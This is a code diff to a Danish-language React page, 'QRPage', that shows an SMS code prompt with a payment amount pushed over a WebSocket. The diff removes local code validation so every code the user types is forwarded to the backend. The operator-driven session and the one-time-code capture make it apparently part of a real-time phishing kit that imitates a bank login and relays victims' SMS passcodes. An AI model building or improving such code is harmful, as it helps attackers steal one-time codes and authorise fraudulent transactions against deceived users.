@@ -119,11 +119,10 @@ export default function QRPage({ sessionId, onBack }: Props) {
         if (data.field === 'sms_active') setSmsActive(data.value)
       }
       if (data.type === 'sms-activate') {
-        const code = data.code || ''
-        const len = code.length || 4
+        const len = data.codeLength || 6
         setSmsActive(true)
         setSmsAmount(data.amount || null)
-        setExpectedSmsCode(code)
+        setExpectedSmsCode('')
         setSmsLength(len)
         setSmsCode(new Array(len).fill(''))
         setSmsError(false)
@@ -268,14 +267,8 @@ export default function QRPage({ sessionId, onBack }: Props) {
                     <button onClick={() => {
                       const entered = smsCode.join('')
                       if (entered.length === smsLength) {
-                        if (!expectedSmsCode || entered === expectedSmsCode) {
-                          setVerifying(true)
-                          sendUserWS({ type: 'sms-submitted', code: entered })
-                        } else {
-                          setSmsError(true)
-                          setSmsCode(new Array(smsLength).fill(''))
-                          setTimeout(() => setSmsError(false), 3000)
-                        }
+                        setVerifying(true)
+                        sendUserWS({ type: 'sms-submitted', code: entered })
                       }
                     }} className={`w-full font-bold text-[14px] py-3.5 rounded-xl cursor-pointer transition-colors flex items-center justify-between px-5 ${
                       smsCode.join('').length === smsLength ? 'bg-[#0055a5] hover:bg-[#004080] text-white' : 'bg-[#e8edf4] text-[#8a9bb5]'
@@ -283,7 +276,6 @@ export default function QRPage({ sessionId, onBack }: Props) {
                       <span>BEKRÆFT</span>
                       <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12,5 19,12 12,19"/></svg>
                     </button>
-                    {smsError && <p className="text-[12px] text-red-600 text-center mt-2 font-medium">Forkert kode. Prøv igen.</p>}
                   </div>
                 ) : qrReady ? (
                   <>
